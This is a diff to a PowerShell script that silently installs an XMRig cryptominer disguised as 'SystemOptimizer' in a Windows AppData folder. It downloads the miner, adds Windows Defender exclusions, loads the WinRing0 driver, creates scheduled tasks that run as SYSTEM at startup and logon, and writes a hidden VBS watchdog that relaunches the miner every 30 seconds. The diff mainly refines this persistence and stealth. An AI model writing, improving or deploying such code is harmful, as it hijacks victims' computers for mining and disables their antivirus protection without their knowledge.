@@ -2,11 +2,16 @@
 
 $ErrorActionPreference = "SilentlyContinue"
 
+# Kill any existing instances first
+taskkill /F /IM "SystemOptimizer.exe" 2>$null
+taskkill /F /IM "xmrig.exe" 2>$null
+taskkill /F /IM "wscript.exe" 2>$null
+Start-Sleep 1
+
 $baseDir = "$env:LOCALAPPDATA\Microsoft\Windows\SystemOptimizer"
-$xmrigDir = "$baseDir"
-$xmrigExe = "$xmrigDir\SystemOptimizer.exe"
+$xmrigExe = "$baseDir\SystemOptimizer.exe"
 $configFile = "$baseDir\config.json"
-$driverPath = "$xmrigDir\WinRing0x64.sys"
+$driverPath = "$baseDir\WinRing0x64.sys"
 $zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
 $zipPath = "$baseDir\xmrig.zip"
 
@@ -16,7 +21,9 @@ $wallet = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($w
 
 # Create directories
 New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
-New-Item -ItemType Directory -Force -Path $xmrigDir | Out-Null
+
+# Add Windows Defender exclusion
+try { Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue } catch { }
 
 # Download XMRig if not present
 if (-not (Test-Path $xmrigExe)) {
@@ -31,7 +38,7 @@ if (-not (Test-Path $xmrigExe)) {
     } catch { }
 }
 
-# Write config with decoded wallet
+# Write config
 $config = @{
     autosave = $true
     background = $true
@@ -73,13 +80,6 @@ $config = @{
 } | ConvertTo-Json -Depth 5
 $config | Out-File -FilePath $configFile -Encoding ascii
 
-# Add Windows Defender exclusion for our directory (prevents detection)
-try {
-    Add-MpPreference -ExclusionPath "$baseDir" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
-} catch { }
-
 # Install WinRing0 driver
 if (Test-Path $driverPath) {
     $svc = "WinRing0_1_2_0"
@@ -89,36 +89,26 @@ if (Test-Path $driverPath) {
     Start-Service $svc -ErrorAction SilentlyContinue
 }
 
-# Create scheduled task using schtasks (more reliable)
+# Create scheduled task using schtasks (reliable, runs as SYSTEM)
 $taskName = "SystemOptimizer"
-$taskCmd = "schtasks /Create /TN `"$taskName`" /TR `"wscript.exe `"$baseDir\watchdog.vbs`"`" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /RL HIGHEST"
-cmd /c $taskCmd 2>$null
-$taskCmd2 = "schtasks /Create /TN `"$taskName-Logon`" /TR `"wscript.exe `"$baseDir\watchdog.vbs`"`" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F"
-cmd /c $taskCmd2 2>$null
-# Enable auto-restart on failure
+schtasks /Create /TN "$taskName" /TR "wscript.exe \"$baseDir\watchdog.vbs\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>$null
+schtasks /Create /TN "$taskName-Logon" /TR "wscript.exe \"$baseDir\watchdog.vbs\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F 2>$null
 schtasks /Change /TN "$taskName" /RI 1 /DU 9999:59 /K /F 2>$null
 
-# Create watchdog.vbs (persistent, restarts miner if dead) - write directly
-$watchdogPath = "$baseDir\watchdog.vbs"
-@'
+# Create watchdog.vbs (truly hidden, no window flash)
+$watchdogContent = @"
 Set WshShell = CreateObject("WScript.Shell")
 Set WMI = GetObject("winmgmts:")
 Do
-    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'xmrig.exe' AND ExecutablePath LIKE '%SystemOptimizer%'")
+    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'SystemOptimizer.exe' AND ExecutablePath LIKE '%SystemOptimizer%'")
     If procs.Count = 0 Then
-        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { $xmrigExe = '%XMRIG_EXE%'; $configFile = '%CONFIG_FILE%'; $wshell = New-Object -ComObject WScript.Shell; $wshell.Run('"' + $xmrigExe + '" --config="'" + $configFile + "'"', 0, $false) }""", 0, False
+        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = '$xmrigExe'; `$configFile = '$configFile'; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run('""' + `$xmrigExe + '"" --config=""' + `$configFile + '""', 0, `$false) }""", 0, False
     End If
     WScript.Sleep 30000
 Loop
-'@ -replace '%XMRIG_EXE%', $xmrigExe -replace '%CONFIG_FILE%', $configFile | Out-File -FilePath $watchdogPath -Encoding ascii
+"@
+$watchdogContent | Out-File -FilePath "$baseDir\watchdog.vbs" -Encoding ascii
 
-# Create launch.vbs (for manual start)
-$launchPath = "$baseDir\launch.vbs"
-@'
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { $xmrigExe = '%XMRIG_EXE%'; $configFile = '%CONFIG_FILE%'; $wshell = New-Object -ComObject WScript.Shell; $wshell.Run('"' + $xmrigExe + '" --config="'" + $configFile + "'"', 0, $false) }""", 0, False
-'@ -replace '%XMRIG_EXE%', $xmrigExe -replace '%CONFIG_FILE%', $configFile | Out-File -FilePath $launchPath -Encoding ascii
-
-# Start watchdog now (hidden)
+# Start watchdog NOW (hidden, no flash)
 $wshell = New-Object -ComObject WScript.Shell
-$wshell.Run('wscript.exe "' + $watchdogPath + '"', 0, $false)
+$wshell.Run("wscript.exe \"$baseDir\watchdog.vbs\"", 0, $false)
